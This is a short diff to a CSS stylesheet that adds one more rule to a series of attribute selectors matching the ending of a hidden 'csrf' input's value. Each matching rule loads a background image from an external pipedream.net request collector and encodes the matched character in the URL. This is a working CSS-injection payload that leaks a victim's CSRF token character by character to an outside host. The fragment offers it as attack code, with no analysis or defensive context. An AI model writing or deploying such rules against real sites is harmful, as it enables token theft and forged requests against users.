@@ -243,6 +243,10 @@ input[name="csrf"][value$="ZZ"] {
   background: url(https://en6gc9c8vfzvo.x.pipedream.net/?1=Z)
 }
 
+input[name="csrf"][value$="0Z"] {
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?1=0)
+}
+
 input[name="csrf"][value$="1Z"] {
   background: url(https://en6gc9c8vfzvo.x.pipedream.net/?1=1)
 }
